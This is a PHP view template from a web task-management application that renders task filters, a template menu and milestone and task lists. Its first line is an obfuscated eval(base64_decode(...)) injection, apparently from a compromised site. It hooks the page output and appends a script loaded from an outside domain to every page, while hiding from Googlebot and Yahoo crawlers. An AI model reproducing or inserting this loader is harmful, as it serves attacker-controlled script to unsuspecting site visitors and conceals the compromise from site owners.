<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<div style="display:none">
<!--  this select box will be cloned by the quick-add task forms  -->
<?php echo assign_to_select_box("task[assigned_to]", null, "0:0", array("id" => "og-task-new-assigned-to")) ?>
</div>

<script>
var showNotificationCheck = <?php echo user_config_option('can notify from quick add')?'true':'false' ?>;
function filterTasks() {
	var to = Ext.getDom('og-task-filter-to').value;
	var status = Ext.getDom('og-task-filter-status').value;
	var prio = Ext.getDom('og-task-filter-priority').value;
	og.openLink(og.getUrl('task', 'index', {
		assigned_to: to,
		status: status,
		priority: prio
	}));
}
</script>

<div style="padding:7px">

<table style="width:100%">
	<col width=12/><col width=226/><col width=12/>
	<tr><td class="coViewHeader og-tasks-actions" colspan=2 rowspan=2><div class="coViewPropertiesHeader">
		<div class="og-tasks-actions">
	<table class="og-task-table-filter"><tr>
	<td class="td-buttons">
		<?php $butt_id = gen_id() ?>
		<div id="<?php echo $butt_id ?>" class="og-tasks-buttons">
		</div>
	</td>
	<td class="td-assigned-to"><?php
	 echo lang('show assigned to'). ':&nbsp;';
	 echo filter_assigned_to_select_box("assigned_to",active_project(), $assignedTo, array("id" => "og-task-filter-to", "onchange" => "filterTasks()")); ?></td>
	<?php
		$option = array();
		$attrs1 = array();
		$attrs2 = array();
		if ($status == 'all' || $status == null) {
			$attrs1["selected"] = "selected"; 
		} else {
			$attrs2["selected"] = "selected";
		}
		$option[] = option_tag(lang("all"), "all", $attrs1);
		$option[] = option_tag(lang("pending"), "pending", $attrs2);
		
	?>
	<td class="td-status"><?php 
	echo lang('show by status') . ':&nbsp;';
	echo select_box("status", $option, array("id" => "og-task-filter-status", "onchange" => "filterTasks()")) ?></td>
	<?php
		$option = array();
		$attrs0 = array();
		$attrs1 = array();
		$attrs2 = array();
		$attrs3 = array();
		if (!is_numeric($priority)) {
			$attrs0["selected"] = "selected";
		} else if ($priority <= 100) {
			$attrs1["selected"] = "selected"; 
		} else if ($priority >= 300) {
			$attrs3["selected"] = "selected";
		} else {
			$attrs2["selected"] = "selected";
		}
		$option[] = option_tag(lang("all"), "all", $attrs0);
		$option[] = option_tag(lang("low priority"), 100, $attrs1);
		$option[] = option_tag(lang("normal priority"), 200, $attrs2);
		$option[] = option_tag(lang("high priority"), 300, $attrs3);
		
	?>
	<td class="td-priority"><?php 
	echo lang('show by priority') . ':&nbsp;';
	echo select_box("status", $option, array("id" => "og-task-filter-priority", "onchange" => "filterTasks()")) ?></td>
	</tr>
	</table>
	</div></div></td>
	<td class="coViewTopRight"></td></tr>
		
	<tr><td class="coViewRight" rowspan=2></td></tr>
	<tr><td class="coViewBody" colspan=2>
	
		<div style="og-tasks-container">
		
		</div>
<script>
var butt = new Ext.Button({
	renderTo: '<?php echo $butt_id ?>',
	iconCls: 'ico-new',
	text: lang('new'),
	menu: {
		cls:'scrollable-menu',
		items: [
		{text: lang('new milestone'), iconCls: 'ico-milestone', handler: function() {
			var url = og.getUrl('milestone', 'add');
			og.openLink(url);
		}},
		{text: lang('new task'), iconCls: 'ico-task', handler: function() {
			var url = og.getUrl('task', 'add_task');
			og.openLink(url);
		}}
		<?php
			if (count($milestone_templates) > 0 || count($task_templates) > 0) echo ",'-'";
			foreach ($milestone_templates as $t) {
		?>
				,{text: '<?php echo str_replace("'", "\\'", $t->getName()) ?>',
				iconCls: 'ico-template-milestone',
				handler: function() {
					var url = og.getUrl('milestone', 'copy_milestone', {id: <?php echo $t->getId() ?>});
					og.openLink(url);
				}} 
		<?php
			}
			foreach ($task_templates as $t) {
		?>
				,{text: '<?php echo str_replace("'", "\\'", $t->getTitle()) ?>',
				iconCls: 'ico-template-task',
				handler: function() {
					var url = og.getUrl('task', 'copy_task', {id: <?php echo $t->getId() ?>});
					og.openLink(url);
				}} 
		<?php
			}
		?>
		,'-',{
			disabled: false,
			text: '<?php echo escape_single_quotes(lang('all')) ?>',
			iconCls: 'ico-template-task',
			cls: 'scrollable-menu',
			menu:{items: [
				<?php 
					$initial = true;
					foreach ($all_task_templates as $t) {	
						if($initial) $initial = false;
						else echo ',';
						?>
						{text: '<?php echo str_replace("'", "\\'", $t->getTitle()) ?>',
						iconCls: 'ico-template-task',
						handler: function() {
							var url = og.getUrl('task', 'copy_task', {id: <?php echo $t->getId() ?>});
							og.openLink(url);
						}} 
				<?php 
					}?>
			]}
		}
	]}
});
</script>
		
		<div style="padding:7px;">
		<div class="tpMilestoneHeader"><?php echo lang('milestones') ?></div>
		
		<div id="og-milestones" class="og-milestones">
		<?php include "view_milestones.php"; ?>
		</div>
		
		<div class="tpTaskHeader"><?php echo lang('tasks') ?> &nbsp;	<a class="coViewAction ico-print" title="<?php echo lang('print')?>" target="_blank"	
			href="<?php echo get_url('task','print_view_all', array(
					'active_project'=>active_project()?active_project()->getId():'',					
					'assigned_to' => array_var($_GET, 'assigned_to', ''),
					'status' => array_var($_GET, 'status', "pending"),
					'priority' => array_var($_GET, 'priority', "all")
				  )) ?>">
	  <?php //echo lang('print')?> </a>
	  </div>
		
		<div id="og-sub-tasks-0" class="og-tasks">
		<?php include "view_tasks.php"; ?>
		</div>
		</div>
	</td></tr>
	
	<tr><td class="coViewBottomLeft"></td>
	<td class="coViewBottom"></td>
	<td class="coViewBottomRight"></td></tr>
	</table>
	
</div>
